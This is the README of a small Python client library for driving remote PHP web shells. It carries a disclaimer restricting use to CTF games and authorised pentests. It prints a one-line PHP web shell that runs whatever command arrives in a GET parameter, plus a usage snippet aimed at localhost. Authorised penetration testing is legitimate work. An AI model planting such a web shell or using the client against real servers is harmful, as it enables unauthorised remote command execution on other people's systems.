# c0n3-shell - Python remote web shell client library

WIP - That project aim to provide simple to use, basic remote web shell client.


# Disclaimer

That library is provided AS-IS, and is **only** intended to be used in the context of **CTF games** and **pentests exercises** with the prior mutual and writen consent of the targeted sites.

The developpers will assume no liability and are not responsible for any misuse or damage caused by that library.

**YOU are responsible for what you do with it.**

It is the end user’s responsibility to obey all applicable local, state and federal laws.


# Usage

That library is intended to be used when you have a remote php shell accepting commands like that:
```
...
<?php passthru($_GET['cmd']); ?>
...
```
To use it, create a simple script, set the target url and various other options.
```
#!/usr/bin/env python
import c0n3shell

shell = c0n3shell.C0n3Shell(url='http://127.0.0.1/index.php')
shell.cmdloop()
```

# Available options

- http_verb: the http method to use, default `get`
- url: the remote shell url
- attribute: the injectable attribute, default `cmd`
